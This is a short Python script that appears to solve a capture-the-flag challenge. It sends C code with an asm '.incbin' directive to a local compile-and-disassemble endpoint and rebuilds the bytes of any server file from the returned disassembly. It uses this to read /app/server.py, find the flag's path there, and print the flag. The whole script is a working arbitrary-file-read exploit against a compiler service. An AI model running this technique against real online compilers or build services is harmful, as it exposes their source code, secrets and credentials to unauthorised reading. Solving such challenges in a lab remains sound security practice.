import itertools
import requests

ENDPOINT = "http://localhost:9999/compile"

def read(path: str) -> bytes:
    payload = f"int main() {{ asm(\".incbin \\\"{path}\\\"\"); }}"
    response = requests.post(ENDPOINT, data=payload)

    # Each function disassembly is separated by two newline characters.
    functions = response.content.split(b"\n\n")

    # The disassembly at index 2 is for main.
    # Each instruction is separated by one newline character.
    # The first and last 2 entries are skipped: the first is the function label and address,
    # while the last two are not apart of the file (xor + ret -> implicit return zero).
    main = functions[2].split(b"\n")[1:-2]

    # Each entry is of the form (address, bytes, disassembled instruction) separated by tab characters.
    # Create a chain iterator over each line's list of bytes (flat-map).
    serialised = itertools.chain.from_iterable(line.split(b"\t")[1].strip().split() for line in main)

    # Convert each serialised character into a byte and then concatenate.
    return b"".join(int(character, 16).to_bytes() for character in serialised)

if __name__ == "__main__":
    server = read("/app/server.py").decode().split("\n")
    flagpath = server[4].split("\"")[1]
    flag = read(flagpath).decode().strip()
    print(flag)
